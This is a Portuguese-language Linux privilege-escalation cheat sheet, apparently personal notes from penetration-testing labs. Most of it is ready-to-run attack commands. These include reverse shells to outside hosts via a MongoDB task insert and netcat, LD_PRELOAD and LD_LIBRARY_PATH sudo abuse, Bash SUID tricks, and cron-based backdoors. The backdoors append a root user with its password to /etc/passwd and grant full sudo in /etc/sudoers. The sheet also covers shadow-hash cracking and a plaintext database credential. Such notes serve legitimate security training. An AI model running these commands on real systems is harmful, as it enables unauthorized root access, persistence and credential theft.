*** Recomendação principal : Ferramentas automatizadas ***

================ Linux Smart Enumeration =================

./lse.sh -l 1

============================ Checar ============================

/var/tmp
/var/mail
/var/logs
/var/backup
/etc

=========================== FIND ===============================

	find / -type f -name test.py
	
	find / -name name*

====================== Procurando SQL Statements ========================

	grep -Ri 'sql' . --color=auto

========================== Service Exploits ==============================

[+ Processos em Root]
	ps -aux | grep -i root --color=auto

[+ MySql]
(Necessário senha de root para o MySQL)

1. Identificar que o MySQL esteja rodando como root
	ps -aux | grep -i root --color=auto
	ps -aux | grep -i root --color=auto | grep -i mysql --color=auto

2. Identificar a versão do MySQL
	mysqld --version
	mysql --version
	
3. Identificar um exploit no ExploitDB
	Procurar User-Defined Function no ExploitDB


[+ MongoDB]
1. Executando comandos do mongo
	mongo -u mark -p 5AYRft73VtFpc84k scheduler
2. Inserindo tasks de RevShell
	db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.19/443 0>&1'"})

=============================== Sudo, SUIDS, GUIDS ====================================

-> sudo -l retorna os comandos que você consegue executar como usuário
	(root : root) -> comandos que pode executar como root
	(scriptmanager : scriptmanager) -> comandos que pode executar como scriptmanager
	(User : User) -> comandos que pode executar como user

	sudo -u NOME_DO_USER_QUE_PODE_RODAR  -> para rodar algo com sudo do usuário

[+ SUDO]

-> Shell escape com GTFobins
	1. sudo -l
	2. GTFobins

-> Information Leak de /etc/shadow
	1. sudo -l
	2. apache2 -f /etc/shadow

-> LD_PRELOAD
	1. sudo -l
	2. Checar se no Matching Default entries tem env_keep+=LD_PRELOAD
	3. Enviar o arquivo preload.c para a máquina vulnerável
	4. Compilar com $ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
	5. sudo LD_PRELOAD=/tmp/preload.so find
	
-> LD_LIBRARY_PATH : fazer um programa SUDO executar uma biblioteca nossa ao invés de uma do programa
	1. sudo -l
	2. Checar se no Matching Default entries tem env_keep+=LD_LIBRARY_PATH
	3. Checar as bibliotecas do programa sudo com $ ldd /usr/sbin/apache2
	4. Escolher uma biblioteca para substituir por uma nossa com mesmo nome
	5. Enviar o arquivo library_path.c para a máquina vulnerável
	6. Compilar o Arquivo com $ gcc -o nomedalib.so -shared -fPIC library_path.c
	7. sudo LD_LIBRARY_PATH=. apache2 #(lembrando que o "." é porque compilamos o arquivo no dir local)

[+ Quando não podemos utilizar su]

	sudo -s
	sudo -i
	sudo /bin/bash
	sudo passwd

[+ SUIDS]
	find / -perm -u=s -type f 2>/dev/null
	
-> Programas com SUIDs e Versões do Shell Anteriores a 4.2-048

Exemplo : Programa em SUID que chama service apache2 start

1. Checar a versão do Bash
	/bin/sh --version
2. Criar uma function para substituir o serviço 
	function /usr/sbin/service { /bin/bash -p; }
3. Exportar a function
	export -f /usr/sbin/service
4. Executar o programa que executa a nossa function 
	/usr/local/bin/suid-env2
	
-> Programas com SUIDs e Versões do Shell Anteriores a 4.4 herdam a variável PS4 de debbugging

1. Checar a versão do Bash
	/bin/sh --version
2. Alterar a variável PS4 para executar um comando no programa com SUID
	env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /var/tmp/rootbash; chmod +s /var/tmp/rootbash)' FULL_PATH_OFF_SUID_BIN

[+ GUIDS]
	find / -perm -g=s -type f 2>/dev/null

[+ Ver os serviços]

->NETWORK
	netstat -tunlp
	ss -tunlp

-> RETORNAR SERVIÇOS ACESSIVEIS APENAS VIA LOCALHOST
	netstat -tunlp |grep -i '127.0.0.1' --color=auto
	
================================ CRON E PsPy ======================================

Exemplo de comando do cron : php /var/www/laravel/artisan schedule:run
1. Significa que estamos a função schedule de algum programa no arquivo /var/www/laravel/artisan
2. Para procurar de onde é essa função basta fazermos grep -R -i "function schedule"

-> Conseguimos ver quais as tarefas do cron pelo lse e logo após ver todo o conteúdo
	cat /etc/crontab

[+ PsPy]

1. Ver se é 32 ou 64 bits
	file /bin/bash
2. Fazer um webserver em /home/kali/transfer
	python -m http.server --bind 192.168.0.33 9000
3. Copiar o psPy na máquina alvo
	wget http://192.168.0.33:9000/pspy64
4. Permissao para pspy
	chmod 755 pspy64

[+ Cron]

Por segurança copiar ambos os arquivos em um sh utilizado pelo Cron

-> Criando um rootbash em /var/tmp
	1. Copiar o dash e setar as devidas permissões
		cp /bin/bash /var/tmp/bash ; chmod u+s /var/tmp/bash
	2. LEMBRAR DE EXECUTAR COM -p (SUID privilleges)
		./dash -p

-> Outro Reverse Shell com netcat com /bin/bash root
	bash -c 'nc -nv 192.168.0.33 4444 -e /bin/bash'

-> Utilizando o Cron para mudar o arquivo /etc/passwd

	1. cp /etc/passwd source/passwd
	2. echo 'root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash' >> /var/tmp/test

	*** The password for this new root2 user will be mrcake ***

-> Utilizando o Cron para mudar o arquivo /etc/sudoers

	echo '<USER> ALL=(ALL:ALL) ALL' >> /etc/sudoers
	
========================= Weak File Permissions ===========================

[Permissão de Leitura]

-> /etc/shadow

	1. Copiar tudo entre o primeiro e o segundo ":" inclusive $6$
	2. john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
	
[Permissão de Escrita]

-> /etc/shadow
	
	1. Fazer o Backup do Arquivo
	2. mkpasswd -m sha-512 newpassword
	3. Copiar a senha e colar em root 

-> /etc/passwd (Alterando senha do root)
	
	1. Gerar uma hash com OpenSSL
	2. openssl passwd "password"
	3. Trocar o "x" da linha de root pela hash em /etc/passwd
	
============================ NFS ==============================

-> Show the NFS server's export list
	$ showmount -e <target>
	
-> Mount NFS Share
	$ mount -o rw,vers=2 <target>:<share> <local_directory>
	
==================== Kernel Exploitation ========================

-> Podemos ver a versao do software com
        cat /etc/issue
        
-> Podemos ver a versão do Kernel com
        uname -r
        
-> Podemos ver a arquitetura do processador com 
        arch
        
-> Podemos ver quantos bits é o processador com
	file /bin/bash
